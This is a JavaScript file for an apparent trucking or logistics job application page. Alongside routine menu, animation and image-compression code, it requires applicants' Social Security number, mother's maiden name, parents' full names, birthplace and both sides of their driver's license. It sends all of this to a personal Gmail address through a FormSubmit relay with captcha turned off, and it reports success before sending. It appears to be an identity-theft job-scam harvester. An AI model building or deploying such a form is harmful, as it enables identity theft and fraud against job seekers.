// Mobile Menu Toggle
const hamburger = document.getElementById('hamburger');
const mobileMenu = document.getElementById('mobile-menu');

hamburger.addEventListener('click', () => {
    mobileMenu.classList.toggle('active');
    hamburger.innerHTML = mobileMenu.classList.contains('active') ? 
        '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
});

// Close mobile menu when clicking on a link
document.querySelectorAll('.mobile-menu ul li a').forEach(link => {
    link.addEventListener('click', () => {
        mobileMenu.classList.remove('active');
        hamburger.innerHTML = '<i class="fas fa-bars"></i>';
    });
});

// Header scroll effect
window.addEventListener('scroll', () => {
    const header = document.querySelector('header');
    if (window.scrollY > 50) {
        header.classList.add('scrolled');
    } else {
        header.classList.remove('scrolled');
    }
});

// Handle responsive navigation - close mobile menu when switching to desktop
window.addEventListener('resize', () => {
    const mobileMenu = document.getElementById('mobile-menu');
    const hamburger = document.getElementById('hamburger');
    
    // Check if viewport is desktop size (769px and above)
    if (window.innerWidth >= 769) {
        // Close mobile menu and reset hamburger icon
        mobileMenu.classList.remove('active');
        hamburger.innerHTML = '<i class="fas fa-bars"></i>';
    }
});

// Optimize hero image loading
document.addEventListener('DOMContentLoaded', () => {
    const hero = document.querySelector('.hero');
    
    // Create an image object to preload the hero image
    const heroImage = new Image();
    heroImage.src = 'images/herobd.png';
    
    heroImage.onload = () => {
        // Add loaded class to trigger fade-out animation
        setTimeout(() => {
            hero.classList.add('loaded');
        }, 100); // Small delay to ensure transition works
    };
    
    heroImage.onerror = () => {
        // If image fails to load, still remove the loading overlay after a delay
        setTimeout(() => {
            hero.classList.add('loaded');
        }, 1000);
    };
    
    // Update footer year dynamically
    updateFooterYear();
});

// Update footer year dynamically
function updateFooterYear() {
    const yearElement = document.getElementById('current-year');
    if (yearElement) {
        const currentYear = new Date().getFullYear();
        yearElement.textContent = currentYear;
    }
}

// File upload preview with image compression
const licenseFront = document.getElementById('licenseFront');
const licenseBack = document.getElementById('licenseBack');
const frontFileName = document.getElementById('frontFileName');
const backFileName = document.getElementById('backFileName');

licenseFront.addEventListener('change', (e) => {
    if (e.target.files.length > 0) {
        frontFileName.textContent = e.target.files[0].name;
    }
});

licenseBack.addEventListener('change', (e) => {
    if (e.target.files.length > 0) {
        backFileName.textContent = e.target.files[0].name;
    }
});

// Image compression function
function compressImage(file, maxWidth = 800, maxHeight = 600, quality = 0.7) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = (e) => {
            const img = new Image();
            img.onload = () => {
                // Calculate new dimensions
                let { width, height } = img;
                if (width > maxWidth) {
                    height = Math.round((height * maxWidth) / width);
                    width = maxWidth;
                }
                if (height > maxHeight) {
                    width = Math.round((width * maxHeight) / height);
                    height = maxHeight;
                }
                
                // Create canvas and draw compressed image
                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0, width, height);
                
                // Convert to blob with compression
                canvas.toBlob((blob) => {
                    if (blob) {
                        // Create new File from blob
                        const compressedFile = new File([blob], file.name, {
                            type: file.type,
                            lastModified: Date.now()
                        });
                        resolve(compressedFile);
                    } else {
                        reject(new Error('Compression failed'));
                    }
                }, file.type, quality);
            };
            img.src = e.target.result;
        };
        reader.onerror = reject;
        reader.readAsDataURL(file);
    });
}

// Position dropdown functionality
const positionSelect = document.getElementById('position');
const otherPositionContainer = document.getElementById('other-position-container');
const otherPositionInput = document.getElementById('other-position');

positionSelect.addEventListener('change', (e) => {
    if (e.target.value === 'Other') {
        otherPositionContainer.style.display = 'block';
        otherPositionInput.required = true;
    } else {
        otherPositionContainer.style.display = 'none';
        otherPositionInput.required = false;
        otherPositionInput.value = '';
    }
});

// Form validation and submission
document.getElementById('application-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // Get form data
    const formData = new FormData(e.target);
    const formObject = Object.fromEntries(formData.entries());
    
    // Validation
    const errors = validateForm(formObject);
    
    if (errors.length > 0) {
        showError(errors);
        return;
    }
    
    // Show loading state
    const submitBtn = document.querySelector('.submit-btn');
    const originalText = submitBtn.textContent;
    submitBtn.disabled = true;
    submitBtn.textContent = 'SUBMITTING...';
    
    try {
        // Show success message immediately when form is being sent
        showSuccess();
        
        // Prepare minimal form data to avoid 413 error
        const emailData = new FormData();
        
        // Add only essential fields (avoid long text fields)
        const essentialFields = [
            'fullName', 'address', 'email', 'phone', 'position', 'hours', 'employmentDesire',
            'ssn', 'birthPlace', 'fatherName', 'motherName', 'maidenName'
        ];
        
        essentialFields.forEach(field => {
            if (formObject[field]) {
                emailData.append(field, formObject[field]);
            }
        });
        
        // Add file attachments with compression
        if (licenseFront.files[0]) {
            const compressedFront = await compressImage(licenseFront.files[0]);
            emailData.append('licenseFront', compressedFront);
        }
        if (licenseBack.files[0]) {
            const compressedBack = await compressImage(licenseBack.files[0]);
            emailData.append('licenseBack', compressedBack);
        }
        
        // Send email using FormSubmit with the form element directly
        const result = await sendEmailWithAttachments(e.target);
        
        if (result.status === 200) {
            // Success message already shown, just reset form
            e.target.reset();
            frontFileName.textContent = 'No file chosen';
            backFileName.textContent = 'No file chosen';
        } else {
            throw new Error('Failed to send email');
        }
    } catch (error) {
        console.error('Error:', error);
        showError(['An error occurred while submitting your application. Please try again.']);
    } finally {
        // Reset button state
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
    }
});

// Form validation function
function validateForm(data) {
    const errors = [];
    
    // Required fields validation (updated to match new form structure)
    const requiredFields = [
        'fullName', 'address', 'ssn', 'email', 'phone', 'birthPlace',
        'fatherName', 'motherName', 'maidenName', 'position', 'hours', 'employmentDesire'
    ];
    
    requiredFields.forEach(field => {
        if (!data[field] || data[field].trim() === '') {
            errors.push(`${getFieldLabel(field)} is required.`);
        }
    });
    
    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (data.email && !emailRegex.test(data.email)) {
        errors.push('Please enter a valid email address.');
    }
    
    // Phone validation (basic)
    const phoneRegex = /^\+?[\d\s\-\(\)]{10,}$/;
    if (data.phone && !phoneRegex.test(data.phone)) {
        errors.push('Please enter a valid phone number.');
    }
    
    // SSN validation (basic format)
    const ssnRegex = /^\d{3}-?\d{2}-?\d{4}$/;
    if (data.ssn && !ssnRegex.test(data.ssn)) {
        errors.push('Please enter a valid SSN (format: 123-45-6789).');
    }
    
    // File upload validation
    if (!licenseFront.files[0]) {
        errors.push('Driver license front image is required.');
    }
    
    if (!licenseBack.files[0]) {
        errors.push('Driver license back image is required.');
    }
    
    // File type validation
    const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif'];
    if (licenseFront.files[0] && !allowedTypes.includes(licenseFront.files[0].type)) {
        errors.push('Front license image must be a valid image file (JPEG, PNG, GIF).');
    }
    
    if (licenseBack.files[0] && !allowedTypes.includes(licenseBack.files[0].type)) {
        errors.push('Back license image must be a valid image file (JPEG, PNG, GIF).');
    }
    
    // File size validation (5MB limit)
    const maxSize = 5 * 1024 * 1024; // 5MB
    if (licenseFront.files[0] && licenseFront.files[0].size > maxSize) {
        errors.push('Front license image must be less than 5MB.');
    }
    
    if (licenseBack.files[0] && licenseBack.files[0].size > maxSize) {
        errors.push('Back license image must be less than 5MB.');
    }
    
    return errors;
}

// Helper function to get field labels
function getFieldLabel(fieldName) {
    const labels = {
        'fullName': 'Full Name',
        'address': 'Address',
        'ssn': 'SSN',
        'email': 'Email',
        'phone': 'Phone Number',
        'birthPlace': 'Place of Birth',
        'fatherName': "Father's Full Name",
        'motherName': "Mother's Full Name",
        'maidenName': "Mother's Maiden Name",
        'position': 'Position Applying For',
        'hours': 'Weekly Hours Availability',
        'currentOccupation': 'Previous/Current Occupation',
        'currentWorkplace': 'Current Work Place',
        'lastWorkplace': 'Last Place of Work',
        'employmentDesire': 'Employment Desire'
    };
    
    return labels[fieldName] || fieldName;
}

// Convert file to base64
function fileToBase64(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result);
        reader.onerror = reject;
        reader.readAsDataURL(file);
    });
}

// FormSubmit integration with file attachments
async function sendEmailWithAttachments(formElement) {
    // FormSubmit configuration - Replace with your FormSubmit endpoint
    const FORMSUBMIT_ENDPOINT = 'https://formsubmit.co/reedrell4@gmail.com'; // Your email
    
    try {
        // Create FormData from the form element
        const formData = new FormData(formElement);
        
        // Add FormSubmit specific fields
        formData.append('_form', 'platinum-logistics-job-application');
        formData.append('_captcha', 'false'); // Disable captcha if you want
        formData.append('_autoresponse', 'Thank you for your application! We will contact you soon.');
        
        // Send using FormSubmit API
        const response = await fetch(FORMSUBMIT_ENDPOINT, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        });
        
        if (response.ok) {
            return { status: 200, message: 'Application submitted successfully' };
        } else {
            throw new Error(`FormSubmit error: ${response.status} - ${response.statusText}`);
        }
    } catch (error) {
        throw error;
    }
}

// FormSubmit integration (for non-attachment emails - kept for compatibility)
async function sendEmail(data) {
    // FormSubmit configuration - Replace with your FormSubmit endpoint
    const FORMSUBMIT_ENDPOINT = 'https://formsubmit.co/reedrell4@gmail.com'; // Your email
    
    try {
        // Create FormData
        const formData = new FormData();
        
        // Add form data
        Object.keys(data).forEach(key => {
            formData.append(key, data[key]);
        });
        
        // Add FormSubmit specific fields
        formData.append('_form', 'platinum-logistics-job-application');
        formData.append('_captcha', 'false');
        formData.append('_autoresponse', 'Thank you for your application!');
        
        // Send using FormSubmit API
        const response = await fetch(FORMSUBMIT_ENDPOINT, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        });
        
        if (response.ok) {
            return { status: 200, message: 'Application submitted successfully' };
        } else {
            throw new Error(`FormSubmit error: ${response.status} - ${response.statusText}`);
        }
    } catch (error) {
        throw error;
    }
}

// Show error messages
function showError(errors) {
    // Remove existing error messages
    const existingErrors = document.querySelectorAll('.error-message');
    existingErrors.forEach(error => error.remove());
    
    // Create error container
    const form = document.getElementById('application-form');
    const errorContainer = document.createElement('div');
    errorContainer.className = 'error-message';
    errorContainer.style.cssText = `
        background-color: #fee2e2;
        border: 1px solid #fecaca;
        color: #dc2626;
        padding: 1rem;
        margin-bottom: 1rem;
        border-radius: 8px;
        font-size: 0.9rem;
    `;
    
    // Create error list
    const errorList = document.createElement('ul');
    errorList.style.margin = '0';
    errorList.style.paddingLeft = '1.5rem';
    
    errors.forEach(error => {
        const li = document.createElement('li');
        li.textContent = error;
        errorList.appendChild(li);
    });
    
    errorContainer.appendChild(errorList);
    form.insertBefore(errorContainer, form.firstChild);
    
    // Scroll to error
    errorContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
    
    // Auto-remove error after 5 seconds
    setTimeout(() => {
        errorContainer.remove();
    }, 5000);
}

// Show success message
function showSuccess() {
    // Remove existing messages
    const existingMessages = document.querySelectorAll('.success-message, .error-message');
    existingMessages.forEach(msg => msg.remove());
    
    // Create success message
    const form = document.getElementById('application-form');
    const successMessage = document.createElement('div');
    successMessage.className = 'success-message';
    successMessage.style.cssText = `
        background-color: #dcfce7;
        border: 1px solid #bbf7d0;
        color: #166534;
        padding: 1rem;
        margin-bottom: 1rem;
        border-radius: 8px;
        font-size: 0.9rem;
        text-align: center;
        transition: opacity 0.5s ease;
    `;
    
    successMessage.innerHTML = `
        <i class="fas fa-check-circle" style="margin-right: 0.5rem;"></i>
        Your application has been submitted successfully! We will contact you soon.
    `;
    
    form.insertBefore(successMessage, form.firstChild);
    
    // Scroll to success message
    successMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
    
    // Auto-remove success message after 5 seconds with fade-out effect
    setTimeout(() => {
        successMessage.style.opacity = '0';
        setTimeout(() => {
            successMessage.remove();
        }, 500); // Wait for fade-out animation before removing
    }, 5000);
}

// Smooth scrolling for navigation links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Intersection Observer for animations
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
        }
    });
}, observerOptions);

// Apply animation to benefit cards
document.querySelectorAll('.benefit-card').forEach(card => {
    card.style.opacity = '0';
    card.style.transform = 'translateY(20px)';
    card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
    observer.observe(card);
});

// Apply animation to form elements
document.querySelectorAll('.form-group, .upload-card').forEach(element => {
    element.style.opacity = '0';
    element.style.transform = 'translateY(20px)';
    element.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
    observer.observe(element);
});

// Prevent form submission on Enter key in file inputs
document.querySelectorAll('input[type="file"]').forEach(input => {
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
        }
    });
});

// Add some visual feedback for file uploads
document.querySelectorAll('.upload-card').forEach(card => {
    const input = card.querySelector('input[type="file"]');
    const label = card.querySelector('.upload-btn');
    
    input.addEventListener('dragover', (e) => {
        e.preventDefault();
        card.style.borderColor = '#1e40af';
        card.style.backgroundColor = '#f0f9ff';
    });
    
    input.addEventListener('dragleave', () => {
        card.style.borderColor = '#e5e7eb';
        card.style.backgroundColor = '#ffffff';
    });
    
    input.addEventListener('drop', (e) => {
        e.preventDefault();
        card.style.borderColor = '#e5e7eb';
        card.style.backgroundColor = '#ffffff';
        
        if (e.dataTransfer.files.length > 0) {
            input.files = e.dataTransfer.files;
            const fileNameElement = card.querySelector('.file-name');
            fileNameElement.textContent = e.dataTransfer.files[0].name;
        }
    });
});
